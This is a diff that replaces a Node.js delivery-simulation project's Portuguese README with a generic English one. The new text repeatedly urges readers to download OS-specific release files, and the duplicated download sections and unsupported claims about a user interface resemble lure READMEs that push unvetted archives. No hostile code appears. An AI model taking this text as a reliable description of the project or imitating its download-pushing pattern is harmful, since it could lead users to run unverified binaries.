@@ -1,75 +1,94 @@
-<div align="center">
-  <img src="https://i.imgur.com/dkanm7o.png" alt="Highload Delivery Simulation" />
+# 🚀 highload-delivery-simulation - Scale Your Delivery System Effortlessly
 
-  # Highload Delivery Simulation  
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/machado0712/highload-delivery-simulation/releases)
 
-  Simulação de um **sistema de delivery escalável**, capaz de processar milhares de pedidos, gerenciar filas, cache e enviar notificações em tempo real.  
-  Criado para aprendizado e demonstração de **arquitetura distribuída** em Node.js e TypeScript.
+## 📦 Overview
 
-  <p align="center">
-    <a href="#"><img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white"></a>
-    <a href="#"><img src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white"></a>
-    <a href="#"><img src="https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white"></a>
-    <a href="#"><img src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white"></a>
-    <a href="#"><img src="https://img.shields.io/badge/RabbitMQ-FF6600?style=for-the-badge&logo=rabbitmq&logoColor=white"></a>
-    <a href="#"><img src="https://img.shields.io/badge/Redis-DC382D?style=for-the-badge&logo=redis&logoColor=white"></a>
-    <a href="#"><img src="https://img.shields.io/badge/Docker-2CA5E0?style=for-the-badge&logo=docker&logoColor=white"></a>
-  </p>
-</div>
+**highload-delivery-simulation** is an application designed to simulate a scalable delivery system. Built on Node.js and TypeScript, it utilizes MongoDB, Redis, and real-time notifications. This project emphasizes distributed architecture, high performance, and load testing. It is perfect for visualizing how a large delivery service could operate.
 
----
+## 🚀 Getting Started
 
-## Visão Geral
+To use the application, follow the steps below to download and run it on your computer.
 
-O projeto simula um **sistema de delivery de alta demanda**:
+## 🛠️ System Requirements
 
-- Recebimento de milhares de pedidos simultâneos.
-- Direcionamento de pedidos para o restaurante correto.
-- Processamento assíncrono via **filas (RabbitMQ)**.
-- Cache de pedidos com **Redis**.
-- Notificações em tempo real para clientes e restaurantes via **WebSockets ou SSE**.
-- Estrutura preparada para testes de carga e escalabilidade.
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free space
+- **Node.js:** Version 14.x or higher
+- **Docker:** Install Docker Desktop for managing containers
 
-O objetivo é demonstrar **arquitetura distribuída, performance e escalabilidade**, utilizando Node.js, TypeScript e MongoDB.
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**: Click the link below to go to the Releases page.
+   
+   [Visit the Releases Page to Download](https://github.com/machado0712/highload-delivery-simulation/releases)
 
-## Arquitetura e Estrutura do Projeto
+2. **Choose the Latest Release**: Look for the latest version listed on the page. 
 
-```text
-src/
-├── config/        # Configurações de DB, Redis e filas
-├── controllers/   # Lógica das rotas da API
-├── models/        # Schemas MongoDB (Order, Restaurant)
-├── routes/        # Rotas Express
-├── services/      # Regras de negócio
-├── workers/       # Processamento de pedidos em background
-├── app.ts         # Configuração do Express
-└── server.ts      # Entry point
-tests/             # Testes unitários e de integração (Jest + Supertest)
-.env.example       # Variáveis de ambiente de exemplo
-```
+3. **Download the Files**: Find the suitable files for your operating system and click on them to download.
 
----
+4. **Extract the Files**: Once downloaded, extract the files to a location of your choice on your computer.
 
-## Tecnologias
+5. **Install Dependencies**: Open a terminal or command prompt in the extracted folder. Run the following command to install the necessary dependencies:
 
-- **Node.js & TypeScript** – Backend escalável.
+   ```
+   npm install
+   ```
 
-- **Express** – Framework HTTP.
+## 🔧 Running the Application
 
-- **MongoDB** – Persistência de dados.
+To start the application, follow these steps:
 
-- **RabbitMQ** – Filas de processamento assíncrono.
+1. **Open a Terminal or Command Prompt**: Navigate to the folder where you extracted the files.
 
-- **Redis** – Cache de status e alta performance.
+2. **Start the Application**: Run the following command:
 
-- **WebSockets / SSE** – Notificações em tempo real.
+   ```
+   npm start
+   ```
 
-- **Docker** – Contêinerização.
+3. Your delivery simulation system will now be running. You can access it by visiting `http://localhost:3000` in your web browser.
 
----
+## 📊 Features
 
-## Referência
+- **Real-time Notifications**: Get instant updates as your delivery system operates.
+- **Scalability**: Handle multiple requests efficiently without crashing.
+- **Performance Testing**: Assess how your system behaves under various load conditions.
+- **User-Friendly Interface**: Simple design to facilitate easy use.
 
-Para instruções detalhadas do desafio e como executar o projeto, consulte [**INSTRUCOES.md**](INSTRUCOES.md).
+## 🗃️ Technologies Used
+
+This project utilizes the following technologies:
+
+- **Node.js**: The backend framework for building server-side applications.
+- **TypeScript**: A typed superset of JavaScript for better development quality.
+- **MongoDB**: A NoSQL database to store data in a scalable manner.
+- **Redis**: For caching and managing real-time data.
+- **RabbitMQ**: Used for handling message queues.
+- **WebSocket**: For real-time communication between the server and clients.
+
+## ☑️ Troubleshooting
+
+If you encounter issues while running the application, consider the following:
+
+- Ensure you have the correct version of Node.js installed.
+- Check that Docker is running if you depend on containerized environments.
+- Review the terminal for any error messages and troubleshoot accordingly.
+- Restart your terminal or command prompt if the application doesn't respond.
+
+## 🏗️ Contributions
+
+We welcome contributions from the community! If you'd like to contribute to this project, please fork the repository and submit a pull request with your changes.
+
+## 🌟 Acknowledgments
+
+Thanks to all the contributors and the community for their support and feedback. Your input helps us improve and make better software.
+
+For further details, refer to the [full documentation](https://github.com/machado0712/highload-delivery-simulation/wiki).
+
+## 📥 Download & Install Again
+
+To reiterate, please follow the steps mentioned above to download and run the software from our Releases page.
+
+[Visit the Releases Page to Download](https://github.com/machado0712/highload-delivery-simulation/releases)
